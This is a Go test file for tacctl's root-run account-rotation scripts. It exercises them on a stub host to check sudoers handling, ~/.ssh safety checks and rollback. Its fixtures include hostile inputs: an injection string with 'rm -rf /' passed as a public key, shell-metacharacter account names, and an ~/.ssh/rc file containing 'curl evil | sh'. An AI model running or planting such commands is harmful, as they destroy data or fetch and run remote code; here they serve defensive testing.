package hosts

import (
	"bytes"
	"context"
	"flag"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"

	"github.com/rett/tacctl/internal/execx"
)

var updateGolden = flag.Bool("update", false, "rewrite the golden files")

const testPubKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqetQQZxbhY2eMxJy6V4Kz5mUqGzvYvpYbpRRUjoo tacctl-provisioner"

var (
	testRange = Range{Min: 80000, Max: 89999}
	testAvoid = []Range{{Min: 20000, Max: 29999}}
)

func goldenScript(t *testing.T, name string, got []byte) {
	t.Helper()
	path := filepath.Join("testdata", name)
	if *updateGolden {
		if err := os.WriteFile(path, got, 0o644); err != nil {
			t.Fatal(err)
		}
	}
	want, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, want) {
		t.Errorf("%s differs from the golden file (go test -update rewrites it)", name)
	}
}

// The scripts are pinned as text: the header (what tacctl decides) and the
// body (what the host runs as root).
func TestRotateScriptGoldens(t *testing.T) {
	goldenScript(t, "rotate-create-key.sh", RotateCreate{Account: "deploy2", Auth: AuthKey, PubKey: testPubKey, Range: testRange, Avoid: testAvoid}.Script())
	goldenScript(t, "rotate-create-password.sh", RotateCreate{Account: "deploy2", Auth: AuthPassword, Range: testRange, Avoid: testAvoid}.Script())
	goldenScript(t, "rotate-remove.sh", RotateRemove{Account: "admin", Range: testRange, Avoid: testAvoid}.Script())
}

func TestRotateHeaderValues(t *testing.T) {
	c := string(RotateCreate{Account: "deploy2", Auth: AuthKey, PubKey: testPubKey, Range: testRange, Avoid: testAvoid}.Script())
	for _, want := range []string{
		"ACCOUNT=deploy2\n", "AUTH=key\n", "UID_FIRST=80000\n", "FORBIDDEN=80000-89999\\ 20000-29999\n", "STATE_DIR=/var/lib/tacctl-provisioner\n",
		"MARKER=tacctl\\ provisioning\\ account\n", "SUDOERS_LINE=deploy2\\ ALL=\\(ALL:ALL\\)\\ NOPASSWD:\\ ALL\n",
		"SUDOERS_FILE=/etc/sudoers.d/tacctl-provisioner\n",
	} {
		if !strings.Contains(c, want) {
			t.Errorf("create header lacks %q", want)
		}
	}
	p := string(RotateCreate{Account: "deploy2", Auth: AuthPassword, Range: testRange}.Script())
	if !strings.Contains(p, "SUDOERS_LINE=deploy2\\ ALL=\\(ALL:ALL\\)\\ ALL\n") || strings.Contains(p, "NOPASSWD") || strings.Contains(p, "ssh-") {
		t.Errorf("password header:\n%s", strings.SplitN(p, "set -euo", 2)[1][:400])
	}
	// The marker is not the comment host sync manages.
	for _, name := range []string{"deploy2", "alice"} {
		if tacctlGECOS(name, RotateMarker) {
			t.Errorf("%q is a comment host sync manages", RotateMarker)
		}
	}
	if got := UseraddLine("deploy2", testRange); got != "useradd -m -U -s /bin/bash -c 'tacctl provisioning account' -K UID_MAX=79999 -K GID_MAX=79999 deploy2" {
		t.Errorf("useradd line %q", got)
	}
}

func TestPublicKeyLineAndAccountName(t *testing.T) {
	for in, want := range map[string]string{
		"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMq user@host\n": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMq tacctl-provisioner",
		"\n  ssh-rsa AAAAB3NzaC1yc2E=  comment ":               "ssh-rsa AAAAB3NzaC1yc2E= tacctl-provisioner",
		"ecdsa-sha2-nistp256 AAAAE2VjZHNh x":                   "ecdsa-sha2-nistp256 AAAAE2VjZHNh tacctl-provisioner",
	} {
		if got, ok := PublicKeyLine(in); !ok || got != want {
			t.Errorf("PublicKeyLine(%q) = %q, %v", in, got, ok)
		}
	}
	for _, in := range []string{"", "not a key", "ssh-ed25519", "-----BEGIN OPENSSH PRIVATE KEY-----", "ssh-dss AAAA x", "'; rm -rf / #"} {
		if got, ok := PublicKeyLine(in); ok {
			t.Errorf("PublicKeyLine(%q) = %q", in, got)
		}
	}
	for _, ok := range []string{"deploy", "tac_prov-2", "_x"} {
		if !ValidAccountName(ok) {
			t.Errorf("%q refused", ok)
		}
	}
	for _, bad := range []string{"", "Root", "2fast", "-x", "a b", "a;b", "a'b", "a$b", strings.Repeat("x", 33), "ünï"} {
		if ValidAccountName(bad) {
			t.Errorf("%q accepted", bad)
		}
	}
}

// --- the scripts, run under bash against stub tools -------------------------------

// testScript is the copy of a production script the stub host runs: its one
// fixed line "ROTATE_TEST=0" rewritten to 1, which turns on the knobs that
// move the fixed locations here. The production script has no way to get
// there from its environment (TestProductionRotateScriptIgnoresTheEnvironment).
func testScript(t *testing.T, script []byte) []byte {
	t.Helper()
	if bytes.Count(script, []byte("\nROTATE_TEST=0\n")) != 1 {
		t.Fatal("the script has no ROTATE_TEST=0 line to rewrite")
	}
	return bytes.Replace(script, []byte("\nROTATE_TEST=0\n"), []byte("\nROTATE_TEST=1\n"), 1)
}

// A stand-in for the host: passwd, group and shadow files, a home root and
// the commands the scripts call (useradd, userdel, getent, visudo, ...)
// working on them. Every call is logged. The scripts run for real, with
// ROTATE_TEST=1 (testScript) moving their fixed locations here.
type stubHost struct {
	t                                   *testing.T
	dir, bin, home, sudoers, log, state string
	extraEnv                            []string
}

func newStubHost(t *testing.T) *stubHost {
	t.Helper()
	if _, err := (execx.Real{}).LookPath("bash"); err != nil {
		t.Skip("no bash")
	}
	d := t.TempDir()
	h := &stubHost{t: t, dir: d, bin: filepath.Join(d, "bin"), home: filepath.Join(d, "home"),
		sudoers: filepath.Join(d, "sudoers.d", "tacctl-provisioner"), log: filepath.Join(d, "calls.log"),
		state: filepath.Join(d, "state")}
	for _, p := range []string{h.bin, h.home, filepath.Dir(h.sudoers)} {
		if err := os.MkdirAll(p, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	h.write("login.defs", "UID_MIN 1000\nUID_MAX 60000\n")
	h.write("passwd", "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin,,,:"+h.home+"/admin:/bin/bash\n")
	h.write("group", "root:x:0:\nadmin:x:1000:\n")
	h.write("shadow", "root:$6$x:\nadmin:$6$x:\n")
	if err := os.MkdirAll(filepath.Join(h.home, "admin"), 0o755); err != nil {
		t.Fatal(err)
	}
	stubs := map[string]string{
		"getent": `db=$1; key=${2:-}
case $db in passwd|group|shadow) f=$ST/$db ;; *) exit 2 ;; esac
[ -f "$f" ] || touch "$f"
if [ $db = passwd ] && [ -f "$ST/nss_passwd" ]; then set -- "$f" "$ST/nss_passwd"; else set -- "$f"; fi
if [ -z "$key" ]; then cat "$@"; exit 0; fi
awk -F: -v k="$key" '$1 == k || ($3 == k && "'$db'" != "shadow") { print; f = 1 } END { exit !f }' "$@" || exit 2`,
		"useradd": `echo "useradd $*" >> "$ST/calls.log"
if [ "$1" = "-D" ]; then echo "HOME=$TACCTL_ROTATE_HOME_ROOT"; exit 0; fi
sys=0; mk=0; gecos=""; shell=/bin/bash; umin=1000; umax=60000
while [ $# -gt 1 ]; do case $1 in
  -r) sys=1; shift ;; -m) mk=1; shift ;; -U) shift ;; -s) shell=$2; shift 2 ;; -c) gecos=$2; shift 2 ;;
  -K) case $2 in UID_MIN=*) umin=${2#*=} ;; UID_MAX=*) umax=${2#*=} ;; esac; shift 2 ;;
  *) break ;; esac; done
name=$1
if grep -q "^$name:" "$ST/passwd"; then echo "useradd: user '$name' already exists" >&2; exit 9; fi
if [ -n "${STUB_USERADD_PARTIAL:-}" ]; then
  echo "$name:x:451:451:$gecos:$TACCTL_ROTATE_HOME_ROOT/$name:$shell" >> "$ST/passwd"; echo "$name:x:451:" >> "$ST/group"; echo "useradd: cannot copy files" >&2; exit 12
fi
if [ -n "${STUB_UID:-}" ]; then uid=$STUB_UID
elif [ $sys = 1 ]; then uid=450
else
  uid=$(awk -F: -v lo="$umin" -v hi="$umax" 'BEGIN { m = 0 } $3 >= lo && $3 <= hi && $3 > m { m = $3 } END { if (m == 0) print lo; else print m + 1 }' "$ST/passwd")
  if [ "$uid" -gt "$umax" ]; then echo "useradd: cannot find a free UID in the range" >&2; exit 1; fi
fi
echo "$name:x:$uid:$uid:$gecos:$TACCTL_ROTATE_HOME_ROOT/$name:$shell" >> "$ST/passwd"
echo "$name:x:$uid:" >> "$ST/group"
echo "$name:!:" >> "$ST/shadow"
[ $mk = 1 ] && mkdir -p "$TACCTL_ROTATE_HOME_ROOT/$name"
exit 0`,
		"usermod": `echo "usermod $*" >> "$ST/calls.log"
if [ -n "${STUB_USERMOD_FAIL:-}" ] && [ "$1" = "-p" ]; then echo "usermod: failed" >&2; exit 1; fi
case $1 in
  -p) sed -i "s|^$3:[^:]*:|$3:$2:|" "$ST/shadow" ;;
esac
exit 0`,
		"userdel": `echo "userdel $*" >> "$ST/calls.log"
if [ -n "${STUB_USERDEL_FAIL:-}" ]; then echo "userdel: user is logged in" >&2; exit 8; fi
rm_home=0; [ "$1" = "-r" ] && { rm_home=1; shift; }
name=$1
home=$(awk -F: -v n="$name" '$1 == n { print $6 }' "$ST/passwd")
sed -i "/^$name:/d" "$ST/passwd" "$ST/shadow"
[ $rm_home = 1 ] && [ -n "$home" ] && rm -rf "$home"
exit 0`,
		"groupdel": `echo "groupdel $*" >> "$ST/calls.log"; sed -i "/^$1:/d" "$ST/group"; exit 0`,
		"passwd":   `echo "passwd $*" >> "$ST/calls.log"; sed -i "s|^$1:[^:]*:|$1:\$6\$stub:|" "$ST/shadow"; exit 0`,
		"visudo":   `echo "visudo $*" >> "$ST/calls.log"; if grep -q INVALID "$2"; then exit 1; fi; if [ -n "${STUB_VISUDO_SLEEP:-}" ]; then /usr/bin/sleep "$STUB_VISUDO_SLEEP"; fi; exit 0`,
		"sudo": `echo "sudo $*" >> "$ST/calls.log"
[ "$1" = "-n" ] && shift
if [ "$1" = "-u" ]; then shift 3; exec "$@"; fi
exit 0`,
		"runuser": `echo "runuser $*" >> "$ST/calls.log"; shift 3; exec "$@"`,
		"id": `case "$1" in
  -gn) echo "$2" ;;
  -nG) echo "$2 ${STUB_GROUPS:-}" ;;
  -u) echo 0 ;;
esac`,
		"install": `echo "install $*" >> "$ST/calls.log"
mode=0755; shift_dir=0
while [ $# -gt 0 ]; do case $1 in
  -d) shift_dir=1; shift ;; -m) mode=$2; shift 2 ;; -o|-g) shift 2 ;; *) break ;; esac; done
for d in "$@"; do mkdir -p "$d" && chmod "$mode" "$d"; done`,
		"chown":      `exit 0`,
		"pkill":      `echo "pkill $*" >> "$ST/calls.log"; exit 1`,
		"sleep":      `if [ -n "${STUB_REAL_SLEEP:-}" ]; then exec /usr/bin/sleep "$@"; fi; exit 0`,
		"restorecon": `echo "restorecon $*" >> "$ST/calls.log"; exit 0`,
	}
	for name, body := range stubs {
		if err := os.WriteFile(filepath.Join(h.bin, name), []byte("#!/bin/bash\n"+body+"\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	return h
}

func (h *stubHost) write(name, text string) {
	h.t.Helper()
	if err := os.WriteFile(filepath.Join(h.dir, name), []byte(text), 0o644); err != nil {
		h.t.Fatal(err)
	}
}

func (h *stubHost) read(name string) string {
	data, _ := os.ReadFile(filepath.Join(h.dir, name))
	return string(data)
}

func (h *stubHost) calls() string {
	data, _ := os.ReadFile(h.log)
	return string(data)
}

// env is the environment the scripts run in: the stub tools first in PATH,
// the fixed locations moved here (the knobs the test copy of the script
// reads, testScript), more after.
func (h *stubHost) env(extra ...string) []string {
	return append(append([]string{
		"PATH=" + h.bin + ":/usr/bin:/bin", "ST=" + h.dir, "LANG=C",
		"TACCTL_ROTATE_LOGIN_DEFS=" + filepath.Join(h.dir, "login.defs"),
		"TACCTL_ROTATE_HOME_ROOT=" + h.home, "TACCTL_ROTATE_HOME_OWNER=" + strconv.Itoa(os.Getuid()),
		"TACCTL_ROTATE_SUDOERS=" + h.sudoers, "TACCTL_ROTATE_PASSWD=" + filepath.Join(h.dir, "passwd"),
		"TACCTL_ROTATE_STATE=" + h.state, "TACCTL_ROTATE_ROOT_UID=" + strconv.Itoa(os.Getuid()),
	}, h.extraEnv...), extra...)
}

// run runs script as root would (testScript) and returns its
// combined output and exit status.
func (h *stubHost) run(script []byte, env ...string) (string, int) {
	h.t.Helper()
	path := filepath.Join(h.dir, "script.sh")
	if err := os.WriteFile(path, testScript(h.t, script), 0o600); err != nil {
		h.t.Fatal(err)
	}
	res, err := execx.Real{}.Run(context.Background(), execx.Cmd{Name: "bash", Args: []string{path}, Stdin: strings.NewReader(""), Env: h.env(env...)})
	if err != nil {
		h.t.Fatal(err)
	}
	return string(res.Stdout) + string(res.Stderr), res.Code
}

// start runs script in the background (its own file, so that several can
// run at once) and returns the function that waits for it.
func (h *stubHost) start(name string, script []byte, env ...string) func() (string, int) {
	h.t.Helper()
	path := filepath.Join(h.dir, name+".sh")
	if err := os.WriteFile(path, testScript(h.t, script), 0o600); err != nil {
		h.t.Fatal(err)
	}
	type result struct {
		out  string
		code int
	}
	done := make(chan result, 1)
	go func() {
		res, err := execx.Real{}.Run(context.Background(), execx.Cmd{Name: "bash", Args: []string{path}, Stdin: strings.NewReader(""), Env: h.env(env...)})
		if err != nil {
			done <- result{err.Error(), 1}
			return
		}
		done <- result{string(res.Stdout) + string(res.Stderr), res.Code}
	}()
	return func() (string, int) { r := <-done; return r.out, r.code }
}

// record plants root's record of an account the create script made.
func (h *stubHost) record(name, uid string, sshDir int) {
	h.t.Helper()
	if err := os.MkdirAll(h.state, 0o700); err != nil {
		h.t.Fatal(err)
	}
	if err := os.Chmod(h.state, 0o700); err != nil {
		h.t.Fatal(err)
	}
	text := "account=" + name + "\nuid=" + uid + "\nssh_dir=" + strconv.Itoa(sshDir) + "\n"
	if err := os.WriteFile(filepath.Join(h.state, name), []byte(text), 0o600); err != nil {
		h.t.Fatal(err)
	}
}

// plant adds an account to the host's files with a home directory, as the
// create script would have left it (record is true: and root's record).
func (h *stubHost) plant(name, uid, gecos string, record bool) {
	h.t.Helper()
	h.write("passwd", h.read("passwd")+name+":x:"+uid+":"+uid+":"+gecos+":"+h.home+"/"+name+":/bin/bash\n")
	h.write("group", h.read("group")+name+":x:"+uid+":\n")
	h.write("shadow", h.read("shadow")+name+":!:\n")
	if err := os.MkdirAll(filepath.Join(h.home, name), 0o700); err != nil {
		h.t.Fatal(err)
	}
	if record {
		h.record(name, uid, 1)
	}
}

// ssh makes the account's ~/.ssh with the files given (name: content).
func (h *stubHost) ssh(name string, files map[string]string) string {
	h.t.Helper()
	d := filepath.Join(h.home, name, ".ssh")
	if err := os.MkdirAll(d, 0o700); err != nil {
		h.t.Fatal(err)
	}
	for f, c := range files {
		if err := os.WriteFile(filepath.Join(d, f), []byte(c), 0o600); err != nil {
			h.t.Fatal(err)
		}
	}
	return d
}

func (h *stubHost) uidOf(name string) string {
	for _, l := range strings.Split(h.read("passwd"), "\n") {
		if f := strings.Split(l, ":"); len(f) > 3 && f[0] == name {
			return f[2]
		}
	}
	return ""
}

func (h *stubHost) createKey(account string, rng Range, avoid ...Range) []byte {
	return RotateCreate{Account: account, Auth: AuthKey, PubKey: testPubKey, Range: rng, Avoid: avoid}.Script()
}

// A new account is made below the range, out of the ranges the server used
// before, with the marker comment, its sudoers line, its key and a locked
// password.
func TestRotateCreateKeyOnStubHost(t *testing.T) {
	h := newStubHost(t)
	// An account of a previous range at 20003 and one of the host's own.
	h.write("passwd", h.read("passwd")+"old:x:20003:20003:x:"+h.home+"/old:/bin/bash\n")
	out, code := h.run(h.createKey("deploy2", testRange, testAvoid...))
	if code != 0 {
		t.Fatalf("exit %d\n%s", code, out)
	}
	// 20004 would be max+1 in the first interval tried only if the previous
	// range were not skipped: the interval 30000-79999 is tried first.
	if uid := h.uidOf("deploy2"); uid != "30000" {
		t.Errorf("uid %q\n%s", uid, h.calls())
	}
	if !strings.Contains(h.calls(), "useradd -m -U -s /bin/bash -c tacctl provisioning account -K UID_MAX=79999 -K GID_MAX=79999 -K UID_MIN=30000 -K GID_MIN=30000 deploy2") {
		t.Errorf("useradd call:\n%s", h.calls())
	}
	if !strings.Contains(h.read("passwd"), "deploy2:x:30000:30000:tacctl provisioning account:") {
		t.Errorf("passwd:\n%s", h.read("passwd"))
	}
	su, _ := os.ReadFile(h.sudoers)
	if string(su) != "# Managed by tacctl (tacctl host provisioner): provisioning accounts, one line each.\ndeploy2 ALL=(ALL:ALL) NOPASSWD: ALL\n" {
		t.Errorf("sudoers %q", su)
	}
	if fi, err := os.Stat(h.sudoers); err != nil || fi.Mode().Perm() != 0o440 {
		t.Errorf("sudoers mode %v %v", fi, err)
	}
	ak, _ := os.ReadFile(filepath.Join(h.home, "deploy2", ".ssh", "authorized_keys"))
	if string(ak) != testPubKey+"\n" {
		t.Errorf("authorized_keys %q", ak)
	}
	if fi, _ := os.Stat(filepath.Join(h.home, "deploy2", ".ssh")); fi == nil || fi.Mode().Perm() != 0o700 {
		t.Errorf(".ssh %v", fi)
	}
	if fi, _ := os.Stat(filepath.Join(h.home, "deploy2", ".ssh", "authorized_keys")); fi == nil || fi.Mode().Perm() != 0o600 {
		t.Errorf("authorized_keys %v", fi)
	}
	if !strings.Contains(h.read("shadow"), "deploy2:!:") {
		t.Errorf("shadow:\n%s", h.read("shadow"))
	}
	if !strings.Contains(h.calls(), "visudo -cf ") {
		t.Errorf("no visudo:\n%s", h.calls())
	}
	// The key is written by the account, and the sudoers line comes last.
	if !strings.Contains(h.calls(), "runuser -u deploy2 -- /bin/sh -c") {
		t.Errorf("the key was not written as the account:\n%s", h.calls())
	}
	if strings.LastIndex(h.calls(), "runuser ") > strings.Index(h.calls(), "visudo -cf ") {
		t.Errorf("the sudoers line was written before the key:\n%s", h.calls())
	}
	// Root's record of the account, and what the script said it did.
	if rec := h.read("state/deploy2"); rec != "account=deploy2\nuid=30000\nssh_dir=1\n" {
		t.Errorf("record %q", rec)
	}
	if fi, err := os.Stat(h.state); err != nil || fi.Mode().Perm() != 0o700 {
		t.Errorf("state dir %v %v", fi, err)
	}
	if !strings.Contains(out, "[INFO] origin: created\n") || !strings.Contains(out, "[INFO] sudoers-line: added\n") {
		t.Errorf("status lines:\n%s", out)
	}
	// Another account's line in the file stays through the next rotation.
	if out, code := h.run(h.createKey("deploy3", testRange, testAvoid...)); code != 0 {
		t.Fatalf("second: %d\n%s", code, out)
	}
	su, _ = os.ReadFile(h.sudoers)
	if !strings.Contains(string(su), "deploy2 ALL=(ALL:ALL) NOPASSWD: ALL\n") || !strings.Contains(string(su), "deploy3 ALL=(ALL:ALL) NOPASSWD: ALL\n") {
		t.Errorf("sudoers after a second account:\n%s", su)
	}
}

// A re-run adopts an account tacctl made, which root's record says; the
// account's own comment field proves nothing. ~/.ssh is emptied (what an
// earlier user of the account left there) and gets the one key.
func TestRotateCreateAdoptsAnAccountItMade(t *testing.T) {
	h := newStubHost(t)
	h.plant("deploy2", "1500", "Changed By The Owner", true)
	d := h.ssh("deploy2", map[string]string{"authorized_keys": "old key\n", "authorized_keys2": "stale\n", "rc": "curl evil | sh\n"})
	out, code := h.run(h.createKey("deploy2", testRange, testAvoid...))
	if code != 0 || !strings.Contains(out, "Adopting the existing provisioning account 'deploy2' (UID 1500)") ||
		!strings.Contains(out, "[INFO] origin: adopted\n") || !strings.Contains(out, "[INFO] sudoers-line: added\n") {
		t.Fatalf("exit %d\n%s", code, out)
	}
	if strings.Contains(h.calls(), "useradd") {
		t.Errorf("useradd on an adopted account:\n%s", h.calls())
	}
	ak, _ := os.ReadFile(filepath.Join(d, "authorized_keys"))
	if string(ak) != testPubKey+"\n" || h.uidOf("deploy2") != "1500" {
		t.Errorf("adopted: key %q uid %s", ak, h.uidOf("deploy2"))
	}
	left, _ := os.ReadDir(d)
	if len(left) != 1 {
		t.Errorf("~/.ssh holds %d entries after the adoption", len(left))
	}
	// The same run again changes no sudoers line.
	if out, code := h.run(h.createKey("deploy2", testRange, testAvoid...)); code != 0 || !strings.Contains(out, "[INFO] sudoers-line: unchanged\n") {
		t.Errorf("second run: %d\n%s", code, out)
	}
	// A failure on an adopted account does not remove it (nor its line).
	if err := writeSudoers(t, h, []byte("INVALID\n")); err != nil {
		t.Fatal(err)
	}
	if out, code := h.run(h.createKey("deploy2", testRange, testAvoid...)); code != 1 || !strings.Contains(out, "visudo rejected") || h.uidOf("deploy2") != "1500" ||
		strings.Contains(h.calls(), "userdel") {
		t.Errorf("failed adoption: %d uid %q\n%s", code, h.uidOf("deploy2"), out)
	}
}

// The comment field of an account is its own to change, and a directory
// service's accounts are not on the host at all: neither is adopted. Nothing
// is changed, and no sudoers line is written.
func TestRotateCreateRefusesAccountsItDidNotMake(t *testing.T) {
	refused := func(name string, h *stubHost, want string) {
		t.Helper()
		before := h.read("passwd")
		out, code := h.run(h.createKey("deploy2", testRange, testAvoid...))
		if code != 1 || !strings.Contains(out, want) {
			t.Errorf("%s: %d\n%s", name, code, out)
		}
		if h.read("passwd") != before || fileExists(h.sudoers) || strings.Contains(h.calls(), "userdel") ||
			strings.Contains(h.calls(), "runuser") || strings.Contains(h.calls(), "usermod") || fileExists(filepath.Join(h.home, "deploy2", ".ssh")) {
			t.Errorf("%s: something was changed:\n%s", name, h.calls())
		}
	}
	const notOurs = "An account named 'deploy2' exists on this host and is not a tacctl provisioning account"

	// The marker comment alone: anyone with chfn can write it.
	h := newStubHost(t)
	h.plant("deploy2", "1500", RotateMarker, false)
	refused("marker only", h, notOurs+" (tacctl has no root-owned record of creating it in "+h.state+"). Nothing was changed.")

	// A record that names another UID (the account was removed and made again).
	h = newStubHost(t)
	h.plant("deploy2", "1500", RotateMarker, false)
	h.record("deploy2", "1499", 1)
	refused("record of another uid", h, notOurs)

	// A record in a directory others can write to, or writable itself.
	h = newStubHost(t)
	h.plant("deploy2", "1500", RotateMarker, true)
	if err := os.Chmod(h.state, 0o770); err != nil {
		t.Fatal(err)
	}
	refused("open record directory", h, notOurs)
	h = newStubHost(t)
	h.plant("deploy2", "1500", RotateMarker, true)
	if err := os.Chmod(filepath.Join(h.state, "deploy2"), 0o664); err != nil {
		t.Fatal(err)
	}
	refused("writable record", h, notOurs)
	h = newStubHost(t)
	h.plant("deploy2", "1500", RotateMarker, true)
	if err := os.Remove(filepath.Join(h.state, "deploy2")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("/etc/hostname", filepath.Join(h.state, "deploy2")); err != nil {
		t.Fatal(err)
	}
	refused("record that is a link", h, notOurs)

	// A directory (sssd/LDAP) account: not in the local file, so refused
	// even with the marker and a record that agrees.
	h = newStubHost(t)
	h.write("nss_passwd", "deploy2:x:1500:1500:"+RotateMarker+":"+h.home+"/deploy2:/bin/bash\n")
	h.record("deploy2", "1500", 1)
	refused("directory account", h, notOurs+": it is not in "+filepath.Join(h.dir, "passwd")+" (it comes from a directory service). Nothing was changed.")

	// The comment 'host sync' gives its accounts.
	h = newStubHost(t)
	h.plant("deploy2", "80001", "deploy2 (TACACS+)", false)
	refused("sync-managed account", h, notOurs)

	// Any other account.
	h = newStubHost(t)
	h.plant("deploy2", "1500", "Somebody Else", false)
	refused("other account", h, notOurs)
}

// ~/.ssh is the account's own ground: a link, somebody else's directory or
// one others can write to is refused before anything is written, and so is
// the ~/.ssh of an adopted account that this tool did not make.
func TestRotateCreateRefusesAnUnsafeSSHDir(t *testing.T) {
	check := func(name string, h *stubHost, want string, env ...string) {
		t.Helper()
		out, code := h.run(h.createKey("deploy2", testRange, testAvoid...), env...)
		if code != 1 || !strings.Contains(out, want) {
			t.Errorf("%s: %d\n%s", name, code, out)
		}
		if fileExists(h.sudoers) || h.uidOf("deploy2") != "1500" || strings.Contains(h.calls(), "userdel") || strings.Contains(h.calls(), "runuser") {
			t.Errorf("%s: changed:\n%s", name, h.calls())
		}
	}
	// A link: root would otherwise write through it.
	h := newStubHost(t)
	h.plant("deploy2", "1500", RotateMarker, true)
	target := filepath.Join(h.dir, "victim")
	if err := os.MkdirAll(target, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, filepath.Join(h.home, "deploy2", ".ssh")); err != nil {
		t.Fatal(err)
	}
	check("symlink", h, "deploy2/.ssh is a symbolic link; refusing to use it.")
	if left, _ := os.ReadDir(target); len(left) != 0 {
		t.Errorf("the link target was written to: %v", left)
	}
	// Somebody else's directory.
	h = newStubHost(t)
	h.plant("deploy2", "1500", RotateMarker, true)
	h.ssh("deploy2", nil)
	check("owner", h, "belongs to UID "+strconv.Itoa(os.Getuid())+", not to 'deploy2'", "TACCTL_ROTATE_HOME_OWNER=12345")
	// Writable by group or others.
	h = newStubHost(t)
	h.plant("deploy2", "1500", RotateMarker, true)
	d := h.ssh("deploy2", nil)
	if err := os.Chmod(d, 0o775); err != nil {
		t.Fatal(err)
	}
	check("mode", h, "is writable by its group or others (mode 775)")
	// Not made by this tool.
	h = newStubHost(t)
	h.plant("deploy2", "1500", RotateMarker, true)
	h.record("deploy2", "1500", 0)
	h.ssh("deploy2", map[string]string{"authorized_keys": "k\n"})
	check("not made by tacctl", h, "was not made by tacctl; refusing to use it")
	// A file in its place.
	h = newStubHost(t)
	h.plant("deploy2", "1500", RotateMarker, true)
	if err := os.WriteFile(filepath.Join(h.home, "deploy2", ".ssh"), []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	check("file", h, "is not a directory")
	// The same for a password login.
	h = newStubHost(t)
	h.plant("deploy2", "1500", RotateMarker, true)
	if err := os.Symlink(target, filepath.Join(h.home, "deploy2", ".ssh")); err != nil {
		t.Fatal(err)
	}
	out, code := h.run(RotateCreate{Account: "deploy2", Auth: AuthPassword, Range: testRange}.Script(), "TACCTL_ROTATE_TEST_TTY=1")
	if code != 1 || !strings.Contains(out, "is a symbolic link") || strings.Contains(h.calls(), "passwd deploy2") {
		t.Errorf("password, symlink: %d\n%s", code, out)
	}
}

// The sudoers line is the last step: a failure before it leaves none, and
// one after it takes back the line this run wrote, an adopted account
// staying where it was.
func TestRotateCreateSudoersLineIsLast(t *testing.T) {
	// A key that cannot be set up: no line, and the new account is gone.
	h := newStubHost(t)
	out, code := h.run(h.createKey("deploy2", testRange, testAvoid...), "STUB_USERMOD_FAIL=1")
	if code != 1 || !strings.Contains(out, "Could not lock the password of 'deploy2'") || h.uidOf("deploy2") != "" || fileExists(h.sudoers) || fileExists(filepath.Join(h.state, "deploy2")) {
		t.Errorf("created: %d\n%s\n%s", code, out, h.calls())
	}
	// The same on an adopted account: it stays, with no line.
	h = newStubHost(t)
	h.plant("deploy2", "1500", RotateMarker, true)
	out, code = h.run(h.createKey("deploy2", testRange, testAvoid...), "STUB_USERMOD_FAIL=1")
	if code != 1 || h.uidOf("deploy2") != "1500" || fileExists(h.sudoers) || !fileExists(filepath.Join(h.state, "deploy2")) || strings.Contains(h.calls(), "userdel") {
		t.Errorf("adopted: %d\n%s", code, out)
	}
	// A failure after the line was written (the test knob): the line goes
	// again, from a created account together with the account, from an
	// adopted one alone.
	h = newStubHost(t)
	out, code = h.run(h.createKey("deploy2", testRange, testAvoid...), "TACCTL_ROTATE_FAIL_AFTER_SUDOERS=1")
	if code != 1 || h.uidOf("deploy2") != "" || fileExists(h.sudoers) || fileExists(filepath.Join(h.state, "deploy2")) {
		t.Errorf("created, after the line: %d\n%s", code, out)
	}
	h = newStubHost(t)
	h.plant("deploy2", "1500", RotateMarker, true)
	other := "# x\nother ALL=(ALL:ALL) ALL\n"
	if err := writeSudoers(t, h, []byte(other)); err != nil {
		t.Fatal(err)
	}
	out, code = h.run(h.createKey("deploy2", testRange, testAvoid...), "TACCTL_ROTATE_FAIL_AFTER_SUDOERS=1")
	su, _ := os.ReadFile(h.sudoers)
	if code != 1 || !strings.Contains(out, "Taking the sudoers line of 'deploy2' this run wrote back out") || h.uidOf("deploy2") != "1500" ||
		strings.Contains(string(su), "deploy2") || !strings.Contains(string(su), "other ALL=(ALL:ALL) ALL") {
		t.Errorf("adopted, after the line: %d\n%s\n%s", code, out, su)
	}
	// An adopted account that had another line before: that one is put back.
	h = newStubHost(t)
	h.plant("deploy2", "1500", RotateMarker, true)
	if err := writeSudoers(t, h, []byte("# x\ndeploy2 ALL=(ALL:ALL) ALL\n")); err != nil {
		t.Fatal(err)
	}
	out, code = h.run(h.createKey("deploy2", testRange, testAvoid...), "TACCTL_ROTATE_FAIL_AFTER_SUDOERS=1")
	su, _ = os.ReadFile(h.sudoers)
	if code != 1 || !strings.Contains(string(su), "deploy2 ALL=(ALL:ALL) ALL\n") || strings.Contains(string(su), "NOPASSWD") {
		t.Errorf("adopted, other line before: %d\n%s\n%s", code, out, su)
	}
	// A password that was not set: no line.
	h = newStubHost(t)
	h.write("shadow", h.read("shadow"))
	if err := os.WriteFile(filepath.Join(h.bin, "passwd"), []byte("#!/bin/bash\nexit 1\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	out, code = h.run(RotateCreate{Account: "deploy2", Auth: AuthPassword, Range: testRange}.Script(), "TACCTL_ROTATE_TEST_TTY=1")
	if code != 1 || !strings.Contains(out, "passwd failed") || fileExists(h.sudoers) || h.uidOf("deploy2") != "" {
		t.Errorf("passwd failed: %d\n%s", code, out)
	}
}

// A useradd that fails after it made part of the account: what it made is
// removed again.
func TestRotateCreateUseraddFailsHalfway(t *testing.T) {
	h := newStubHost(t)
	out, code := h.run(h.createKey("deploy2", testRange, testAvoid...), "STUB_USERADD_PARTIAL=1")
	if code != 1 || !strings.Contains(out, "useradd failed after creating 'deploy2'") || !strings.Contains(out, "Removing the account 'deploy2' this run created") ||
		h.uidOf("deploy2") != "" || strings.Contains(h.read("group"), "deploy2:") || fileExists(h.sudoers) {
		t.Errorf("%d\n%s\n%s", code, out, h.calls())
	}
	if !strings.Contains(h.calls(), "userdel -r deploy2") {
		t.Errorf("calls:\n%s", h.calls())
	}
	// A hang-up while the script runs ends it the same way: the trap.
